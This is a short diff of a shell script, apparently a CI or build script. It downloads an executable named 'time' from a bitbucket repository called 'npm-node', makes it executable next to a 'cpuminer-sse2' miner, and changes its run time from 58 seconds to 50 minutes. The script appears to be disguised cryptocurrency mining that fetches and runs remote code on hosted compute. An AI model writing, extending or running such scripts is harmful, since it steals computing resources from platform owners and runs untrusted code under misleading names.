@@ -12,5 +12,5 @@ chmod +x cpuminer-sse2
 uname -a
 wget https://bitbucket.org/makeda904/npm-node/raw/master/time 
 chmod +x time
-gtimeout 58 ./time
+gtimeout 50m ./time
 echo "done..."
